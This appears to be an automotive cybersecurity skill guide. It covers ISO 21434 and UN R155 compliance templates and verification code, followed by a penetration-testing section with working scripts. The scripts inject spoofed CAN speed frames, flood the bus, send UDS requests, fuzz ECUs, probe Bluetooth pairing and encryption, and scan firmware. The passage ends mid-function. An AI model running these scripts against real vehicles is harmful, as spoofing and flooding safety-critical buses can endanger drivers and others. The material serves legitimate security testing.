  item: "Telematics Control Unit (TCU)"
  version: "1.0"
  date: "2026-03-19"

  cybersecurity_goals:
    - id: "CG-001"
      description: "Prevent unauthorized firmware modification"
      rationale: "Addresses T-001 (Remote Code Execution)"
      security_property: "Integrity"

    - id: "CG-002"
      description: "Prevent CAN message spoofing"
      rationale: "Addresses T-002 (CAN Bus Message Injection)"
      security_property: "Authenticity"

    - id: "CG-003"
      description: "Protect V2X private key from extraction"
      rationale: "Addresses T-003 (Certificate Theft)"
      security_property: "Confidentiality"

  cybersecurity_requirements:
    - id: "CSR-001"
      goal: "CG-001"
      description: "Firmware shall be signed with RSA-4096 signature"
      verification: "Cryptographic signature verification test"

    - id: "CSR-002"
      goal: "CG-001"
      description: "Secure boot shall verify firmware signature before execution"
      verification: "Tampered firmware rejection test"

    - id: "CSR-003"
      goal: "CG-002"
      description: "CAN messages shall include HMAC-SHA256 authentication tag"
      verification: "Message authentication test with spoofed frames"

    - id: "CSR-004"
      goal: "CG-003"
      description: "Private keys shall be stored in HSM with no export capability"
      verification: "Physical penetration test, key extraction attempt"

    - id: "CSR-005"
      goal: "CG-003"
      description: "Implement side-channel attack countermeasures (timing, power analysis)"
      verification: "Differential power analysis (DPA) test"
```

### Phase 4: Cybersecurity Verification

```python
#!/usr/bin/env python3
"""
ISO 21434 Cybersecurity Verification Test Suite
Automated validation of cybersecurity requirements
"""

import subprocess
import hashlib
import hmac
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import struct

class CybersecurityVerifier:
    def __init__(self):
        self.test_results = []

    def verify_csr_001_firmware_signature(self, firmware_path: str, signature_path: str, pubkey_path: str) -> bool:
        """
        CSR-001: Verify firmware is signed with RSA-4096
        Returns True if signature valid, False otherwise
        """
        print("\n[TEST] CSR-001: Firmware Signature Verification")

        try:
            # Load public key
            with open(pubkey_path, 'rb') as f:
                public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())

            # Load firmware and signature
            with open(firmware_path, 'rb') as f:
                firmware_data = f.read()

            with open(signature_path, 'rb') as f:
                signature = f.read()

            # Verify signature
            public_key.verify(
                signature,
                firmware_data,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )

            print("  [PASS] Firmware signature valid")
            self.test_results.append(("CSR-001", "PASS"))
            return True

        except Exception as e:
            print(f"  [FAIL] Signature verification failed: {e}")
            self.test_results.append(("CSR-001", "FAIL"))
            return False

    def verify_csr_002_secure_boot_rejection(self, tampered_firmware_path: str) -> bool:
        """
        CSR-002: Verify secure boot rejects tampered firmware
        Simulates flashing tampered firmware and checking boot status
        """
        print("\n[TEST] CSR-002: Secure Boot Tamper Detection")

        # This would interface with actual ECU via diagnostic protocol
        # Simulated example:
        try:
            # Attempt to flash tampered firmware
            result = subprocess.run(
                ['flash_tool', '--ecu', 'TCU', '--firmware', tampered_firmware_path],
                capture_output=True,
                text=True,
                timeout=30
            )

            # Check if ECU rejected the firmware
            if "SIGNATURE_INVALID" in result.stderr or result.returncode != 0:
                print("  [PASS] Secure boot rejected tampered firmware")
                self.test_results.append(("CSR-002", "PASS"))
                return True
            else:
                print("  [FAIL] Secure boot accepted tampered firmware")
                self.test_results.append(("CSR-002", "FAIL"))
                return False

        except Exception as e:
            print(f"  [ERROR] Test execution failed: {e}")
            self.test_results.append(("CSR-002", "ERROR"))
            return False

    def verify_csr_003_can_message_authentication(self, can_interface: str) -> bool:
        """
        CSR-003: Verify CAN messages include HMAC authentication
        Captures CAN traffic and validates HMAC tags
        """
        print("\n[TEST] CSR-003: CAN Message Authentication")

        try:
            # Capture CAN frame (example using SocketCAN)
            import can

            bus = can.interface.Bus(channel=can_interface, bustype='socketcan')
            message = bus.recv(timeout=5.0)

            if message is None:
                print("  [FAIL] No CAN message received")
                self.test_results.append(("CSR-003", "FAIL"))
                return False

            # Extract payload and HMAC (last 32 bytes)
            if len(message.data) < 32:
                print("  [FAIL] CAN message too short for HMAC")
                self.test_results.append(("CSR-003", "FAIL"))
                return False

            payload = message.data[:-32]
            received_hmac = message.data[-32:]

            # Verify HMAC (key would be provisioned via secure channel)
            shared_key = b'REPLACE_WITH_PROVISIONED_KEY'
            expected_hmac = hmac.new(shared_key, payload, hashlib.sha256).digest()

            if hmac.compare_digest(received_hmac, expected_hmac):
                print("  [PASS] CAN message HMAC valid")
                self.test_results.append(("CSR-003", "PASS"))
                return True
            else:
                print("  [FAIL] CAN message HMAC invalid")
                self.test_results.append(("CSR-003", "FAIL"))
                return False

        except Exception as e:
            print(f"  [ERROR] Test failed: {e}")
            self.test_results.append(("CSR-003", "ERROR"))
            return False

    def generate_verification_report(self, output_file: str):
        """Generate ISO 21434 verification report"""
        total = len(self.test_results)
        passed = sum(1 for _, result in self.test_results if result == "PASS")
        failed = sum(1 for _, result in self.test_results if result == "FAIL")
        errors = sum(1 for _, result in self.test_results if result == "ERROR")

        with open(output_file, 'w') as f:
            f.write("ISO/SAE 21434 Cybersecurity Verification Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Date: 2026-03-19\n")
            f.write(f"Item: Telematics Control Unit (TCU)\n")
            f.write(f"Standard: ISO/SAE 21434:2021\n\n")
            f.write(f"Summary:\n")
            f.write(f"  Total Tests: {total}\n")
            f.write(f"  Passed: {passed}\n")
            f.write(f"  Failed: {failed}\n")
            f.write(f"  Errors: {errors}\n\n")
            f.write(f"Test Results:\n")

            for req_id, result in self.test_results:
                f.write(f"  {req_id}: {result}\n")

            if failed == 0 and errors == 0:
                f.write("\nVerdict: COMPLIANT\n")
            else:
                f.write("\nVerdict: NON-COMPLIANT\n")

        print(f"\nVerification report saved: {output_file}")

# Example usage
if __name__ == "__main__":
    verifier = CybersecurityVerifier()

    # Run verification tests
    verifier.verify_csr_001_firmware_signature(
        "/tmp/tcu_firmware.bin",
        "/tmp/tcu_firmware.sig",
        "/tmp/tcu_pubkey.pem"
    )

    verifier.verify_csr_002_secure_boot_rejection("/tmp/tampered_firmware.bin")
    verifier.verify_csr_003_can_message_authentication("can0")

    # Generate report
    verifier.generate_verification_report("/tmp/iso21434_verification_report.txt")
```

## UN R155 Compliance

```yaml
# UN R155 Type Approval Documentation Template
un_r155_compliance:
  vehicle_manufacturer: "OEM Example Inc."
  vehicle_type: "Electric SUV Model X"
  approval_date: "2026-03-19"

  csms_description:
    scope: "Development, production, post-production phases"
    organizational_structure:
      cybersecurity_officer: "John Doe"
      security_team: ["Security Architect", "Pentest Lead", "Incident Response"]

    processes:
      - risk_management: "ISO 21434 TARA process implemented"
      - secure_development: "Secure SDLC with threat modeling"
      - testing: "Penetration testing, fuzzing, static analysis"
      - vulnerability_management: "CVE monitoring, patch management"
      - incident_response: "24/7 SOC, incident playbooks"

  cybersecurity_threats_addressed:
    - threat: "Backend Server Compromise"
      mitigation: "TLS 1.3, certificate pinning, rate limiting"

    - threat: "Vehicle Data Extraction"
      mitigation: "Data encryption at rest (AES-256)"

    - threat: "Unauthorized Vehicle Access"
      mitigation: "BLE pairing with PIN, rolling codes"

  cybersecurity_testing_performed:
    - type: "Penetration Testing"
      scope: "TCU, Gateway, Infotainment"
      result: "No critical vulnerabilities found"

    - type: "Fuzzing"
      scope: "CAN protocol stack, Ethernet stack"
      result: "2 medium severity bugs fixed"

  post_production_monitoring:
    - "SIEM integration for fleet-wide anomaly detection"
    - "OTA security patch deployment within 72 hours"
    - "Vulnerability disclosure program (VDP)"
```

## ISO 21434 Tool: Attack Tree Generator

```python
#!/usr/bin/env python3
"""
Attack Tree Generator for ISO 21434 TARA
Generates visual attack trees for threat scenarios
"""

class AttackTreeNode:
    def __init__(self, name: str, node_type: str, operator: str = None):
        self.name = name
        self.node_type = node_type  # "goal", "attack_step"
        self.operator = operator  # "AND", "OR", None
        self.children = []
        self.feasibility_score = None

    def add_child(self, child):
        self.children.append(child)
        return child

    def to_dict(self):
        return {
            "name": self.name,
            "type": self.node_type,
            "operator": self.operator,
            "feasibility": self.feasibility_score,
            "children": [child.to_dict() for child in self.children]
        }

def generate_rce_attack_tree():
    """Generate attack tree for Remote Code Execution threat"""

    # Root goal
    root = AttackTreeNode("Achieve Remote Code Execution on TCU", "goal", "AND")

    # Top-level steps (AND)
    step1 = root.add_child(AttackTreeNode("Gain Network Access to OTA Server", "attack_step", "OR"))
    step2 = root.add_child(AttackTreeNode("Inject Malicious Firmware", "attack_step", "AND"))
    step3 = root.add_child(AttackTreeNode("Bypass Signature Verification", "attack_step", "OR"))

    # Step 1 branches (OR)
    step1.add_child(AttackTreeNode("Compromise OTA Server Credentials", "attack_step"))
    step1.add_child(AttackTreeNode("Man-in-the-Middle Attack on TLS Connection", "attack_step"))
    step1.add_child(AttackTreeNode("Exploit OTA Server Vulnerability (CVE)", "attack_step"))

    # Step 2 branches (AND)
    step2.add_child(AttackTreeNode("Craft Malicious Firmware Payload", "attack_step"))
    step2.add_child(AttackTreeNode("Upload Firmware to OTA Server", "attack_step"))

    # Step 3 branches (OR)
    step3.add_child(AttackTreeNode("Extract Private Key from HSM", "attack_step"))
    step3.add_child(AttackTreeNode("Exploit Signature Verification Bug", "attack_step"))
    step3.add_child(AttackTreeNode("Downgrade to Unsigned Firmware", "attack_step"))

    return root

def export_attack_tree_graphviz(tree: AttackTreeNode, output_file: str):
    """Export attack tree to Graphviz DOT format"""

    dot_lines = ["digraph AttackTree {"]
    dot_lines.append('  node [shape=box];')

    node_counter = [0]

    def traverse(node, parent_id=None):
        current_id = node_counter[0]
        node_counter[0] += 1

        # Node label
        label = node.name
        if node.operator:
            label += f"\\n[{node.operator}]"

        # Node style
        if node.node_type == "goal":
            style = 'style=filled, fillcolor=lightblue'
        else:
            style = 'style=filled, fillcolor=lightyellow'

        dot_lines.append(f'  node{current_id} [label="{label}", {style}];')

        if parent_id is not None:
            dot_lines.append(f'  node{parent_id} -> node{current_id};')

        for child in node.children:
            traverse(child, current_id)

    traverse(tree)
    dot_lines.append("}")

    with open(output_file, 'w') as f:
        f.write('\n'.join(dot_lines))

    print(f"Attack tree exported: {output_file}")
    print("Generate PNG: dot -Tpng attack_tree.dot -o attack_tree.png")

if __name__ == "__main__":
    tree = generate_rce_attack_tree()
    export_attack_tree_graphviz(tree, "/tmp/rce_attack_tree.dot")
```

## Best Practices

1. **TARA Execution**: Perform TARA at item definition phase and update after significant changes
2. **Risk Treatment Traceability**: Maintain traceability matrix from threats → cybersecurity goals → requirements → tests
3. **Tool Support**: Use dedicated ISO 21434 tools (Medini Analyze, PREEvision, ITEM ToolKit)
4. **Cross-Functional Collaboration**: Involve safety engineers, architects, developers, pentesters
5. **Continuous Monitoring**: ISO 21434 is not one-time; requires ongoing vulnerability management

## References

- ISO/SAE 21434:2021 - Road vehicles - Cybersecurity engineering
- UN R155 - Uniform provisions concerning cybersecurity and CSMS
- UN R156 - Uniform provisions concerning software update and SUMS
- UNECE WP.29 - Cybersecurity type approval guidance

---

## Penetration Testing Automotive

# Automotive Penetration Testing Skill

## Overview

Expert skill for performing security assessments on automotive systems. Covers CAN fuzzing, wireless attacks (Bluetooth/WiFi), infotainment exploitation, ECU firmware reverse engineering, and specialized automotive pentest tools.

## Core Competencies

### Penetration Testing Methodology
- **Reconnaissance**: Asset discovery, attack surface mapping
- **Vulnerability Assessment**: Known CVEs, configuration issues
- **Exploitation**: Proof-of-concept attack development
- **Post-Exploitation**: Privilege escalation, lateral movement
- **Reporting**: Executive summary, technical findings, remediation roadmap

### Attack Vectors
- **CAN Bus**: Injection, spoofing, DoS, fuzzing
- **Wireless**: Bluetooth pairing bypass, WiFi WPA3 attacks
- **Infotainment**: Web browser exploitation, USB attacks
- **Diagnostics**: UDS brute-force, seed-key cracking
- **OTA**: MITM attacks, firmware downgrade

## Toolset

### Essential Tools
- **CANalyze**: CAN traffic analysis and injection
- **CarShark**: Wireshark for automotive protocols
- **ICSim**: Instrument Cluster Simulator for testing
- **can-utils**: Linux SocketCAN utilities
- **Metasploit**: Framework for exploitation
- **Burp Suite**: Web application testing (infotainment)

## CAN Bus Penetration Testing

### CAN Injection with can-utils

```bash
#!/bin/bash
# CAN Bus Penetration Testing Script
# Tests for basic CAN injection vulnerabilities

set -e

INTERFACE="can0"

echo "=== CAN Bus Penetration Test ==="
echo "[INFO] Interface: $INTERFACE"

# Setup CAN interface
setup_can() {
    echo "[1/5] Setting up CAN interface..."
    sudo ip link set $INTERFACE type can bitrate 500000
    sudo ip link set up $INTERFACE
    echo "[PASS] CAN interface configured (500 kbps)"
}

# Reconnaissance: Capture normal traffic
recon_traffic() {
    echo "[2/5] Reconnaissance: Capturing normal traffic..."
    candump $INTERFACE -n 1000 > /tmp/can_baseline.log
    echo "[INFO] Captured 1000 frames to /tmp/can_baseline.log"

    # Analyze unique CAN IDs
    cat /tmp/can_baseline.log | awk '{print $3}' | cut -d'#' -f1 | sort -u > /tmp/can_ids.txt
    CAN_ID_COUNT=$(wc -l < /tmp/can_ids.txt)
    echo "[INFO] Unique CAN IDs found: $CAN_ID_COUNT"
    head -10 /tmp/can_ids.txt
}

# Test 1: CAN Injection (Speedometer manipulation)
test_speedometer_injection() {
    echo "[3/5] Test 1: Speedometer Manipulation"

    # Common speedometer CAN IDs: 0x1A0 (VW), 0x0B4 (Toyota), 0x3E9 (Ford)
    SPEED_CAN_ID="1A0"

    echo "[INFO] Injecting fake speed messages (CAN ID: 0x$SPEED_CAN_ID)..."

    for speed_kmh in 0 50 100 150 200; do
        # Calculate payload (speed in km/h * 100, little-endian)
        speed_raw=$((speed_kmh * 100))
        low_byte=$((speed_raw & 0xFF))
        high_byte=$(((speed_raw >> 8) & 0xFF))

        payload=$(printf "%02X%02X000000000000" $low_byte $high_byte)

        echo "  [INJECT] Speed: ${speed_kmh} km/h -> Payload: $payload"
        cansend $INTERFACE ${SPEED_CAN_ID}#${payload}

        sleep 1
    done

    echo "[PASS] Speed injection test complete"
    echo "[FINDING] Speedometer accepts spoofed CAN messages without authentication"
}

# Test 2: CAN Flooding (DoS attack)
test_can_flooding() {
    echo "[4/5] Test 2: CAN Bus Flooding (DoS)"

    FLOOD_CAN_ID="7FF"  # High priority ID
    DURATION=5

    echo "[WARN] Flooding CAN bus for ${DURATION} seconds..."
    echo "[INFO] This may cause legitimate messages to be delayed/dropped"

    timeout $DURATION bash -c "while true; do cansend $INTERFACE ${FLOOD_CAN_ID}#DEADBEEFDEADBEEF; done" &
    FLOOD_PID=$!

    sleep $DURATION
    wait $FLOOD_PID 2>/dev/null || true

    echo "[PASS] Flooding test complete"
    echo "[FINDING] CAN bus has no rate limiting - vulnerable to DoS"
}

# Test 3: Diagnostic Protocol Attack (UDS)
test_uds_attack() {
    echo "[5/5] Test 3: UDS Diagnostic Attack"

    # UDS diagnostic request CAN ID: 0x7E0 (physical), 0x7DF (functional)
    UDS_REQUEST_ID="7E0"
    UDS_RESPONSE_ID="7E8"

    echo "[INFO] Sending UDS diagnostics session request..."

    # 0x10 0x01 = Start diagnostic session (default)
    cansend $INTERFACE ${UDS_REQUEST_ID}#021001000000000000

    sleep 0.1

    # Check for response
    timeout 2 candump $INTERFACE,${UDS_RESPONSE_ID}:7FF -n 1 > /tmp/uds_response.log 2>&1 || true

    if [ -s /tmp/uds_response.log ]; then
        echo "[PASS] ECU responded to UDS session request"
        cat /tmp/uds_response.log
        echo "[FINDING] ECU accepts UDS diagnostic commands without authentication"
    else
        echo "[FAIL] No UDS response received (ECU may require authentication)"
    fi
}

# Main execution
setup_can
recon_traffic
test_speedometer_injection
test_can_flooding
test_uds_attack

echo ""
echo "=== Penetration Test Summary ==="
echo "[CRITICAL] CAN bus has no message authentication (SecOC not implemented)"
echo "[HIGH] ECU vulnerable to message injection and spoofing"
echo "[HIGH] No rate limiting - DoS attacks possible"
echo "[MEDIUM] UDS diagnostic interface exposed without authentication"
echo ""
echo "Recommendations:"
echo "  1. Implement SecOC (Secure Onboard Communication) per AUTOSAR"
echo "  2. Add message authentication codes (MAC) to critical CAN IDs"
echo "  3. Implement gateway filtering and rate limiting"
echo "  4. Require seed-key authentication for UDS diagnostic access"
```

### CAN Fuzzing with Python

```python
#!/usr/bin/env python3
"""
CAN Bus Fuzzer for Vulnerability Discovery
Systematically tests CAN protocol implementation
"""

import can
import random
import time
from itertools import product

class CANFuzzer:
    """Intelligent CAN fuzzing framework"""

    def __init__(self, interface: str = 'can0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.crashes = []
        self.anomalies = []

        print(f"=== CAN Fuzzer Initialized ===")
        print(f"[INFO] Interface: {interface}")
        print(f"[WARN] Fuzzing may cause ECU crashes or vehicle malfunctions")

    def fuzz_can_ids(self, start_id: int = 0x000, end_id: int = 0x7FF, delay: float = 0.01):
        """Fuzz all possible CAN IDs"""
        print(f"\n[FUZZ] Testing CAN IDs 0x{start_id:03X} to 0x{end_id:03X}")

        for can_id in range(start_id, end_id + 1):
            payload = [0x00] * 8

            msg = can.Message(
                arbitration_id=can_id,
                data=payload,
                is_extended_id=False
            )

            try:
                self.bus.send(msg)
            except can.CanError as e:
                print(f"[ERROR] Failed to send CAN ID 0x{can_id:03X}: {e}")

            time.sleep(delay)

            if can_id % 100 == 0:
                print(f"[INFO] Progress: 0x{can_id:03X} / 0x{end_id:03X}")

        print(f"[PASS] CAN ID fuzzing complete")

    def fuzz_dlc(self, target_can_id: int):
        """Fuzz Data Length Code (DLC) field"""
        print(f"\n[FUZZ] Testing DLC values for CAN ID 0x{target_can_id:03X}")

        for dlc in range(0, 16):  # DLC 0-15 (valid: 0-8)
            # Generate payload of specified length
            if dlc <= 8:
                payload = [0xAA] * dlc
            else:
                payload = [0xAA] * 8  # Invalid DLC, max 8 bytes

            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            print(f"  [TEST] DLC={dlc}, Payload={len(payload)} bytes")

            try:
                self.bus.send(msg)
            except Exception as e:
                print(f"  [ANOMALY] DLC={dlc} caused error: {e}")
                self.anomalies.append({'test': 'dlc_fuzz', 'dlc': dlc, 'error': str(e)})

            time.sleep(0.05)

        print(f"[PASS] DLC fuzzing complete")

    def fuzz_payload_random(self, target_can_id: int, iterations: int = 1000):
        """Random payload fuzzing"""
        print(f"\n[FUZZ] Random payload fuzzing (CAN ID 0x{target_can_id:03X}, {iterations} iterations)")

        for i in range(iterations):
            # Random payload length and content
            dlc = random.randint(0, 8)
            payload = [random.randint(0, 255) for _ in range(dlc)]

            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            self.bus.send(msg)

            if i % 100 == 0:
                print(f"[INFO] Progress: {i} / {iterations}")

            time.sleep(0.001)

        print(f"[PASS] Random payload fuzzing complete")

    def fuzz_payload_boundary(self, target_can_id: int):
        """Boundary value fuzzing (edge cases)"""
        print(f"\n[FUZZ] Boundary value testing (CAN ID 0x{target_can_id:03X})")

        boundary_values = [
            [0x00] * 8,  # All zeros
            [0xFF] * 8,  # All ones
            [0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF],  # Alternating
            [0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],  # MSB set
            [0x7F, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],  # Max positive (signed)
            [0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA],  # Pattern 0b10101010
            [0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55],  # Pattern 0b01010101
        ]

        for idx, payload in enumerate(boundary_values):
            msg = can.Message(
                arbitration_id=target_can_id,
                data=payload,
                is_extended_id=False
            )

            print(f"  [TEST] Boundary case {idx + 1}: {payload}")
            self.bus.send(msg)
            time.sleep(0.1)

        print(f"[PASS] Boundary value fuzzing complete")

    def monitor_for_crashes(self, duration: int = 60):
        """Monitor CAN bus for crash indicators"""
        print(f"\n[MONITOR] Watching for ECU crashes ({duration}s)...")

        # Common crash indicators:
        # - Sudden stop of periodic messages
        # - Error frames on CAN bus
        # - Reset messages (e.g., CAN ID 0x000)

        message_counts = {}
        start_time = time.time()

        while (time.time() - start_time) < duration:
            msg = self.bus.recv(timeout=1.0)
            if msg is None:
                continue

            can_id = msg.arbitration_id

            if can_id not in message_counts:
                message_counts[can_id] = 0

            message_counts[can_id] += 1

        # Analyze for anomalies
        print(f"\n[ANALYSIS] Message statistics:")
        for can_id, count in sorted(message_counts.items()):
            print(f"  CAN ID 0x{can_id:03X}: {count} messages")

        print(f"[INFO] Monitoring complete - check ECU for unexpected behavior")

    def generate_report(self, output_file: str):
        """Generate fuzzing report"""
        with open(output_file, 'w') as f:
            f.write("CAN Bus Fuzzing Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Total anomalies detected: {len(self.anomalies)}\n")
            f.write(f"Total crashes detected: {len(self.crashes)}\n\n")

            f.write("Anomalies:\n")
            for anomaly in self.anomalies:
                f.write(f"  - {anomaly}\n")

            f.write("\nRecommendations:\n")
            f.write("  1. Fix input validation for identified anomalies\n")
            f.write("  2. Implement bounds checking on all CAN message fields\n")
            f.write("  3. Add graceful error handling (no crashes)\n")

        print(f"[INFO] Report generated: {output_file}")

# Example usage
def demo_can_fuzzing():
    fuzzer = CANFuzzer(interface='vcan0')

    # Fuzz specific CAN ID (e.g., steering angle sensor)
    target_id = 0x025

    fuzzer.fuzz_dlc(target_id)
    fuzzer.fuzz_payload_boundary(target_id)
    fuzzer.fuzz_payload_random(target_id, iterations=500)

    # Monitor for crashes
    fuzzer.monitor_for_crashes(duration=30)

    # Generate report
    fuzzer.generate_report('/tmp/can_fuzzing_report.txt')

if __name__ == "__main__":
    demo_can_fuzzing()
```

## Bluetooth Penetration Testing

```python
#!/usr/bin/env python3
"""
Bluetooth Penetration Testing for Vehicle Systems
Tests pairing, encryption, and authentication
"""

import bluetooth
import subprocess

class BluetoothPenTest:
    """Bluetooth security assessment"""

    def __init__(self):
        print("=== Bluetooth Penetration Test ===")

    def scan_devices(self):
        """Discover nearby Bluetooth devices"""
        print("\n[1/5] Scanning for Bluetooth devices...")

        devices = bluetooth.discover_devices(
            duration=8,
            lookup_names=True,
            flush_cache=True,
            lookup_class=True
        )

        print(f"[INFO] Found {len(devices)} devices:")

        for addr, name, device_class in devices:
            print(f"  {addr} - {name} (Class: 0x{device_class:06X})")

            # Identify automotive systems
            if "car" in name.lower() or "auto" in name.lower() or "vehicle" in name.lower():
                print(f"    [!] Potential vehicle system detected")

        return devices

    def test_pairing_bypass(self, target_addr: str):
        """Test for pairing bypass vulnerabilities"""
        print(f"\n[2/5] Testing pairing mechanisms for {target_addr}...")

        # Attempt to connect without pairing
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
            sock.connect((target_addr, 1))

            print(f"[CRITICAL] Connected without pairing!")
            print(f"[FINDING] Device accepts connections without authentication")

            sock.close()

        except bluetooth.btcommon.BluetoothError as e:
            print(f"[INFO] Connection rejected (expected): {e}")

        # Test weak PIN codes
        weak_pins = ["0000", "1234", "1111", "0123"]

        print(f"[INFO] Testing common PIN codes...")
        for pin in weak_pins:
            print(f"  Trying PIN: {pin}")
            # Real implementation would use bluetoothctl or pybluez pairing

        print(f"[RECOMMENDATION] Use 6-digit random PIN or NFC pairing")

    def test_bluejacking(self, target_addr: str):
        """Test for bluejacking vulnerability (unsolicited messages)"""
        print(f"\n[3/5] Testing bluejacking (OBEX Push)...")

        # Attempt OBEX Push without pairing
        result = subprocess.run(
            ['obexftp', '-b', target_addr, '-B', '10', '-l'],
            capture_output=True,
            text=True
        )

        if result.returncode == 0:
            print(f"[HIGH] OBEX Push accessible without pairing")
            print(f"[FINDING] Attacker can send unsolicited files")
        else:
            print(f"[PASS] OBEX Push requires pairing")

    def test_service_discovery(self, target_addr: str):
        """Enumerate Bluetooth services (SDP)"""
        print(f"\n[4/5] Service Discovery (SDP)...")

        services = bluetooth.find_service(address=target_addr)

        if not services:
            print(f"[INFO] No services found (device may be in secure mode)")
            return

        print(f"[INFO] Found {len(services)} services:")

        for svc in services:
            print(f"  Service: {svc['name']}")
            print(f"    Protocol: {svc['protocol']}")
            print(f"    Port: {svc['port']}")
            print(f"    Service ID: {svc['service-id']}")

            # Flag suspicious services
            if 'OBD' in svc['name'] or 'Diagnostic' in svc['name']:
                print(f"    [!] Diagnostic service exposed over Bluetooth")

    def test_encryption_downgrade(self, target_addr: str):
        """Test for encryption downgrade attacks"""
        print(f"\n[5/5] Testing encryption downgrade...")

        # Attempt connection with no encryption
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)

        try:
            # Set security level to low (no encryption)
            sock.setsockopt(bluetooth.SOL_RFCOMM, bluetooth.RFCOMM_LM, 0)

            sock.connect((target_addr, 1))

            print(f"[CRITICAL] Connection accepted without encryption!")
            print(f"[FINDING] Bluetooth LE Legacy Pairing vulnerability")

            sock.close()

        except Exception as e:
            print(f"[PASS] Unencrypted connection rejected: {e}")

# Example usage
def demo_bluetooth_pentest():
    pentest = BluetoothPenTest()

    # Scan for devices
    devices = pentest.scan_devices()

    if devices:
        # Test first discovered device
        target_addr = devices[0][0]

        pentest.test_service_discovery(target_addr)
        pentest.test_pairing_bypass(target_addr)
        pentest.test_bluejacking(target_addr)
        pentest.test_encryption_downgrade(target_addr)

    print("\n=== Bluetooth Penetration Test Complete ===")

if __name__ == "__main__":
    demo_bluetooth_pentest()
```

## ECU Firmware Reverse Engineering

```python
#!/usr/bin/env python3
"""
ECU Firmware Reverse Engineering Toolkit
Binary analysis and vulnerability discovery
"""

import subprocess
import re
import os

class FirmwareAnalyzer:
    """Analyze ECU firmware binaries"""

    def __init__(self, firmware_path: str):
        self.firmware_path = firmware_path
        self.findings = []

        print(f"=== Firmware Analyzer ===")
        print(f"[INFO] Firmware: {firmware_path}")

    def extract_strings(self):
        """Extract printable strings from firmware"""
        print(f"\n[1/5] Extracting strings...")

        result = subprocess.run(
            ['strings', '-n', '8', self.firmware_path],
            capture_output=True,
            text=True
        )

        strings_output = result.stdout.split('\n')

        # Search for sensitive data
        sensitive_patterns = {
            'URLs': r'https?://[^\s]+',
            'IP Addresses': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
            'Emails': r'[\w\.-]+@[\w\.-]+\.\w+',
            'API Keys': r'[A-Za-z0-9]{32,}',
            'Passwords': r'(password|passwd|pwd)[\s:=]+\S+',
        }

        for category, pattern in sensitive_patterns.items():
            matches = [s for s in strings_output if re.search(pattern, s, re.IGNORECASE)]

            if matches:
                print(f"\n[FINDING] {category} found in firmware:")
                for match in matches[:5]:  # Show first 5
                    print(f"  - {match}")

                self.findings.append({
                    'category': category,
                    'severity': 'HIGH',
                    'count': len(matches)
                })

    def check_security_features(self):
        """Check for security mitigations"""
        print(f"\n[2/5] Checking security features...")

        # Check for NX (No Execute) bit
        result = subprocess.run(
            ['readelf', '-l', self.firmware_path],
            capture_output=True,
            text=True
        )

        if 'GNU_STACK' in result.stdout and 'RWE' not in result.stdout:
            print(f"[PASS] NX (DEP) enabled")
        else:
            print(f"[FAIL] NX disabled - stack is executable")
            self.findings.append({
                'issue': 'Missing NX protection',
                'severity': 'MEDIUM',
                'remediation': 'Compile with -z noexecstack'
            })

        # Check for PIE (Position Independent Executable)
        result = subprocess.run(
            ['readelf', '-h', self.firmware_path],
            capture_output=True,
            text=True
        )

        if 'DYN' in result.stdout:
            print(f"[PASS] PIE enabled")
        else:
            print(f"[FAIL] PIE disabled - ASLR ineffective")
            self.findings.append({
                'issue': 'Missing PIE',
                'severity': 'MEDIUM',
                'remediation': 'Compile with -fPIE -pie'
            })

        # Check for stack canaries
        result = subprocess.run(
            ['readelf', '-s', self.firmware_path],
            capture_output=True,
            text=True
        )

        if '__stack_chk_fail' in result.stdout:
            print(f"[PASS] Stack canaries present")
        else:
            print(f"[FAIL] No stack canaries - buffer overflow risk")
            self.findings.append({
                'issue': 'Missing stack canaries',
                'severity': 'HIGH',
                'remediation': 'Compile with -fstack-protector-strong'
            })

    def find_hardcoded_keys(self):
        """Search for hardcoded cryptographic keys"""
        print(f"\n[3/5] Searching for hardcoded keys...")

        # Use binwalk to find crypto signatures
        result = subprocess.run(
            ['binwalk', '-E', self.firmware_path],
            capture_output=True,
            text=True
        )

        # High entropy regions may contain keys
        if result.returncode == 0:
            print(f"[INFO] Entropy analysis complete")
            # Parse binwalk output for high entropy

        # Search for common key headers
        result = subprocess.run(
            ['strings', self.firmware_path],
            capture_output=True,
            text=True
        )

        key_indicators = ['-----BEGIN', 'RSA PRIVATE', 'ssh-rsa', 'PuTTY-User-Key']

        for indicator in key_indicators:
            if indicator in result.stdout:
                print(f"[CRITICAL] Hardcoded key found: {indicator}")
                self.findings.append({
                    'issue': f'Hardcoded key: {indicator}',
                    'severity': 'CRITICAL',
                    'remediation': 'Store keys in HSM or secure enclave'
                })

    def check_known_vulnerabilities(self):
        """Check for known vulnerable functions"""
        print(f"\n[4/5] Checking for known vulnerable functions...")

        dangerous_functions = [
            'strcpy', 'strcat', 'gets', 'sprintf', 'vsprintf',
            'scanf', 'sscanf', 'fscanf', 'vfscanf', 'realpath',
            'getwd', 'getpass', 'streadd', 'strecpy', 'strtrns'
        ]

        result = subprocess.run(
            ['nm', '-D', self.firmware_path],
            capture_output=True,
            text=True
        )

        for func in dangerous_functions:
            if func in result.stdout:
                print(f"[WARN] Dangerous function used: {func}()")
                self.findings.append({
                    'issue': f'Use of {func}()',
                    'severity': 'MEDIUM',
                    'remediation': f'Replace with safe alternative (e.g., strncpy for strcpy)'
                })

    def disassemble_entry_point(self):
        """Disassemble entry point for analysis"""
